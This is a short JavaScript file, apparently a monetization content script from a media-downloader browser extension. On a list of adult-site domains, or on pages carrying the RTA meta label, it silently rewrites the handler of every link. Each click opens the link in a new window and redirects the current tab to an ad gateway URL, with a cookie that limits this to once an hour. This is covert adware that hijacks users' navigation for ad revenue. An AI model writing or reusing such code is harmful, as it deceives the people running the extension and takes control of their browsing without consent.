( function(){
	
	var sign 		= "GAM-Monetize",
		expi		= ( 60 * 60 * 1000 ), // 1H
		monetize 	= window[ sign ] = {},
		signthis	= function( flag ){
			
			flag = flag || "";
			
			var d = new Date();
			d.setTime( d.getTime() + expi );

			var expires = "expires=" + d.toUTCString();
			document.cookie = sign + flag + "=1;" + expires + ";path=/";
			
		},
		isthissigned 	= function( flag ){
			
			flag = flag || "";
			
			return ( document.cookie.indexOf( sign + flag + "=1" ) > -1 );
			
		};
	
	monetize.porn = function( service ){
		
		if( !service )return false;
		
		var myflag = "-Porn",
			hosts  = [

				/^(?:([a-z]{0,}\.)?)youporn\.com/g,
				/^(?:([a-z]{0,}\.)?)redtube\.com/g,
				/^(?:([a-z]{0,}\.)?)watch8x\.com/g,
				/^(?:([a-z]{0,}\.)?)letsjav\.com/g,
				/^(?:([a-z]{0,}\.)?)pornhub\.com/g,
				/^(?:([a-z]{0,}\.)?)beeg\.com/g,
				/^(?:([a-z]{0,}\.)?)camwhores\.tv/g,
				/^(?:([a-z]{0,}\.)?)watchjavonline\.com/g,
				/^(?:([a-z]{0,}\.)?)3javdaily\.com/g,
				/^(?:([a-z]{0,}\.)?)xhamster\.com/g,
				/^(?:([a-z]{0,}\.)?)gotporn\.com/g,
				/^(?:([a-z]{0,}\.)?)javsex\.net/g,
				/^(?:([a-z]{0,}\.)?)rec\-tube\.com/g,
				/^(?:([a-z]{0,}\.)?)tube8\.com/g,
				/^(?:([a-z]{0,}\.)?)xnxx\.com/g,
				/^(?:([a-z]{0,}\.)?)xvideos\.com/g,
				/^(?:([a-z]{0,}\.)?)porn\.com/g

			],
			host 	 	= location.host,			
			hostcheck 	= function( myhost ){

				return host.match( myhost );

			},
			ispornsite = document.querySelector( "meta[content='RTA-5042-1996-1400-1577-RTA']" );

		if( ( hosts.some( hostcheck ) || ispornsite ) && !isthissigned( myflag ) ){

			var mylinks = document.querySelectorAll( "a" );

			mylinks.forEach( function( elem, index ){

				elem.onclick = function(){

					signthis( myflag );

					window.open( elem.href );

					location.href = service;			

					return false;

				};

			} ); // forEach

		} // if
		
	}; // monetize.porn
	
	monetize.porn( "https://grabanymedia.ssl.altervista.org/extension/ads/gateway.php?g=porn" );
	
} )();